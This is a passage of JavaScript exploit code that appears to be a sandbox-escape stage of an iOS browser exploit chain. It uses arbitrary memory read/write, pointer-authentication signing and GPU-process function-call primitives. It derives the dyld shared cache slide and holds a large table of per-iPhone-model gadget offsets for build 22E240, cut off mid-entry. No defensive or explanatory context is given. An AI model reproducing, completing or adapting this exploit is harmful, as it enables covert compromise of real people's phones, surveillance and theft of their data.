(() => {
  sbx1_begin = Date.now();
  const peCode = "&v={{LPE_64BITE}}";
  let wc_fcall = fcall;
  let wc_uread64 = read64;
  let uread64 = gpuRead64;
  let uwrite64 = gpuWrite64;
  let pacia = gpuPacia;
  let pacib = gpuPacib;
  let gpu_fcall_sleep = null && gpuFcallEnableSleep;
  let gpu_fcall_wake = null && gpuFcallDisableSleep;
  function LOG(msg) {
    if (true) log('sbx1: ' + msg);
  }
  let wc_get_cstring = function (js_str) {
    let s = js_str + "\x00";
    resolve_rope(s);
    return wc_uread64(wc_uread64(addrof(s) + 0x8n) + 0x8n);
  };
  let get_cstring = function (js_str) {
    let gpu_cstr = gpuCopyBuffer(wc_get_cstring(js_str), BigInt(js_str.length) + 1n);
    return gpu_cstr;
  };
  let func_resolve = function (symbol) {
    return gpuDlsym(0xFFFFFFFFFFFFFFFEn, symbol);
  };
  let GPU_CALLOC = func_resolve("calloc");
  function gpu_new_uint64_t(val = 0n) {
    let buf = gpu_fcall(GPU_CALLOC, 1n, 0x8n);
    uwrite64(buf, val);
    return buf;
  }
  function adjust_pivot_stack() {
    return;
  }
  function get_shared_cache_slide() {
    if (globalThis['sc_slide'] != undefined) {
      return sc_slide;
    }
    let start_address = gpu_new_uint64_t();
    gpu_fcall(func_resolve("syscall"), 294n, 0n, 0n, 0n, 0n, 0n, 0n, 0n, start_address);
    let DYLD_SHARED_CACHE_LOAD_ADDR = 0x0000000180000000n;
    let dyld_shared_cache_slide = uread64(start_address) - DYLD_SHARED_CACHE_LOAD_ADDR;
    return dyld_shared_cache_slide;
  }
  function uread8(where) {
    return uread_bitsize(where, 8n).asInt32s()[0];
  }
  function uwrite8(where, what) {
    return uwrite_bitsize(where, BigInt(what), 8n);
  }
  function cmp8_wait_for_change(where, what) {
    return;
    let target = BigInt(what);
    while (true) {
      let val = uread64(where) & 0xffn;
      if (val != target) {
        break;
      }
    }
  }
  function cmp8_wait_for_value(where, what) {
    let target = BigInt(what);
    let start_interval = Date.now();
    let diff = 0;
    while (true && diff < 2000) {
      let val = uread64(where) & 0xffn;
      if (val == target) {
        break;
      }
      const now = Date.now();
      diff = now - start_interval;
    }
    if(diff >= 2000)
    {
      LOG("Break on timeout");
      return false;
    }
    return true;
  }
  function xpac(ptr) {
    return ptr.noPAC();
  }
  let shared_cache_slide = get_shared_cache_slide();
  let dyld_patching_fptr_offset = 0x208n;
  let integrated = true;
  let use_js_thread = 0;
  let set_x19_gadget = 0n;
  let set_x30_gadget = 0n;
  let load_x0_0x0_gadget = 0n;
  let load_x0_0x0_gadget_data = 0n;
  let new_save_x0_gadget = 0n;
  let new_save_x0_gadget_data = 0n;
  let isNAN_lr_gadget = 0n;
  let mov_x8_x0_gadget = 0n;
  let leak_surface_address_gadget = 0n;
  let mov_x0_x8_gadget = 0n;
  let save_sp_gadget = 0n;
  let save_x0_gadget = 0n;
  let save_x0_gadget_data = 0n;
  let mov_x20_x19_gadget = 0n;
  let restore_sp_gadget = 0n;
  let xpac_gadget = 0n;
  let restore_sp_gadget_data = 0n;
  let load_x1_0x30_gadget = 0n;
  let load_x1_0x30_gadget_data = 0n;
  let load_x0_0x18_gadget = 0n;
  let load_x0_0x18_gadget_data = 0n;
  let dyld_objc_patching_gadget = 0n;
  let dyld_signPointer_gadget = 0n;
  let dyld_patching_noprolog_gadget = 0n;
  let malloc_restore_2_gadget = 0n;
  let set_sp_gadget = 0n;
  let read_surface_address_gadget = 0n;
  let malloc_restore_0_gadget = 0n;
  let malloc_restore_1_gadget = 0n;
  let malloc_restore_3_gadget = 0n;
  let dyld_patching_dispatcher_gadget = 0n;
  let braaz_x8_gadget = 0n;
  let transformSurface_gadget = 0n;
  let tcall_CRLG = 0n;
  let tcall_X0LG = 0n;
  let tcall_RLG = 0n;
  let tcall_CSSG = 0n;
  let tcall_DSSG = 0n;
  let tcall_DG = 0n;
  let _CFObjectCopyProperty = 0n;
  let load_x1x3x8 = 0n;
  let fcall_14_args_write_x8 = 0n;
  let _4_fcalls = 0n;
  let self_loop = 0n;
  let jsvm_isNAN_fcall_gadget = 0n;
  let jsvm_isNAN_fcall_gadget2 = 0n;
  let store_x0_x0 = 0n;
  let str_x1_x2 = 0n;
  let mov_x0_x22 = 0n;
  let add_x22_0x90 = 0n;
  if (integrated) {
    sbx1_offsets = {
   "iPhone11,2_4_6_22E240": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23ecf72ecn,
      tcall_X0LG: 0x21ed72f24n,
      tcall_RLG: 0x20db32218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x260f0198cn,
      fcall_14_args_write_x8: 0x24c44cf7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a994fd4n,
      transformSurface_gadget: 0x20ff18970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone11,8_22E240": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23ecbf2ecn,
      tcall_X0LG: 0x21ed6ef24n,
      tcall_RLG: 0x20db2e218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x260ef098cn,
      fcall_14_args_write_x8: 0x24c414f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a95cfd4n,
      transformSurface_gadget: 0x20ff14970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone12,1_22E240": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23ecc32ecn,
      tcall_X0LG: 0x21ed72f24n,
      tcall_RLG: 0x20db32218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x260fe298cn,
      fcall_14_args_write_x8: 0x24c460f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a960fd4n,
      transformSurface_gadget: 0x20ff18970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone12,3_5_22E240": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23ecc32ecn,
      tcall_X0LG: 0x21ed72f24n,
      tcall_RLG: 0x20db32218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x260fe298cn,
      fcall_14_args_write_x8: 0x24c460f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a960fd4n,
      transformSurface_gadget: 0x20ff18970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone12,8_22E240": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23ebdb2ecn,
      tcall_X0LG: 0x21ed6ef24n,
      tcall_RLG: 0x20db2e218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x260f2198cn,
      fcall_14_args_write_x8: 0x24c370f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a878fd4n,
      transformSurface_gadget: 0x20ff14970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone13,1_22E240": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23eae52ecn,
      tcall_X0LG: 0x21ed85f24n,
      tcall_RLG: 0x20db32218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x26127d98cn,
      fcall_14_args_write_x8: 0x24c633f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a782fd4n,
      transformSurface_gadget: 0x20ff18970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone13,2_3_22E240": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23eae92ecn,
      tcall_X0LG: 0x21ed89f24n,
      tcall_RLG: 0x20db36218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x26161e98cn,
      fcall_14_args_write_x8: 0x24c637f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a786fd4n,
      transformSurface_gadget: 0x20ff1c970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone13,4_22E240": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23eae92ecn,
      tcall_X0LG: 0x21ed89f24n,
      tcall_RLG: 0x20db36218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x26161e98cn,
      fcall_14_args_write_x8: 0x24c637f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a786fd4n,
      transformSurface_gadget: 0x20ff1c970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone14,2_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eabd2ecn,
      tcall_X0LG: 0x21ed8df24n,
      tcall_RLG: 0x20db3a218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x2619ec98cn,
      fcall_14_args_write_x8: 0x24c683f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a75afd4n,
      transformSurface_gadget: 0x20ff20970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone14,3_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eabd2ecn,
      tcall_X0LG: 0x21ed8df24n,
      tcall_RLG: 0x20db3a218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x2619ec98cn,
      fcall_14_args_write_x8: 0x24c683f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a75afd4n,
      transformSurface_gadget: 0x20ff20970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone14,4_22E240": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23eab52ecn,
      tcall_X0LG: 0x21ed85f24n,
      tcall_RLG: 0x20db32218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x26164398cn,
      fcall_14_args_write_x8: 0x24c67bf7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a752fd4n,
      transformSurface_gadget: 0x20ff18970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone14,5_22E240": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23eab52ecn,
      tcall_X0LG: 0x21ed85f24n,
      tcall_RLG: 0x20db32218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x26164398cn,
      fcall_14_args_write_x8: 0x24c67bf7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a752fd4n,
      transformSurface_gadget: 0x20ff18970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone14,6_22E240": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23ea312ecn,
      tcall_X0LG: 0x21ed89f24n,
      tcall_RLG: 0x20db36218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x2615f298cn,
      fcall_14_args_write_x8: 0x24c5eff7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a6cefd4n,
      transformSurface_gadget: 0x20ff1c970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone14,7_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eacd2ecn,
      tcall_X0LG: 0x21ed9df24n,
      tcall_RLG: 0x20db4a218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261a0398cn,
      fcall_14_args_write_x8: 0x24c693f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a76afd4n,
      transformSurface_gadget: 0x20ff30970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone14,8_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eacd2ecn,
      tcall_X0LG: 0x21ed9df24n,
      tcall_RLG: 0x20db4a218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261a0398cn,
      fcall_14_args_write_x8: 0x24c693f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a76afd4n,
      transformSurface_gadget: 0x20ff30970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone15,2_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb0d2ecn,
      tcall_X0LG: 0x21ed9df24n,
      tcall_RLG: 0x20db4a218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261df898cn,
      fcall_14_args_write_x8: 0x24c6d4f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aafd4n,
      transformSurface_gadget: 0x20ff30970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone15,3_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb0d2ecn,
      tcall_X0LG: 0x21ed9df24n,
      tcall_RLG: 0x20db4a218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261df898cn,
      fcall_14_args_write_x8: 0x24c6d4f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aafd4n,
      transformSurface_gadget: 0x20ff30970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone15,4_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb112ecn,
      tcall_X0LG: 0x21eda1f24n,
      tcall_RLG: 0x20db4e218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261a9d98cn,
      fcall_14_args_write_x8: 0x24c6d8f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aefd4n,
      transformSurface_gadget: 0x20ff34970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone15,5_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb112ecn,
      tcall_X0LG: 0x21eda1f24n,
      tcall_RLG: 0x20db4e218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261a9d98cn,
      fcall_14_args_write_x8: 0x24c6d8f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aefd4n,
      transformSurface_gadget: 0x20ff34970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone16,1_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb112ecn,
      tcall_X0LG: 0x21eda5f24n,
      tcall_RLG: 0x20db52218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x2625fc98cn,
      fcall_14_args_write_x8: 0x24ce88f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aefd4n,
      transformSurface_gadget: 0x20ff38970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone16,2_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb112ecn,
      tcall_X0LG: 0x21eda5f24n,
      tcall_RLG: 0x20db52218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x2625fc98cn,
      fcall_14_args_write_x8: 0x24ce88f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aefd4n,
      transformSurface_gadget: 0x20ff38970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone17,1_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb112ecn,
      tcall_X0LG: 0x21eda5f24n,
      tcall_RLG: 0x20db52218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261ee098cn,
      fcall_14_args_write_x8: 0x24c76cf7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
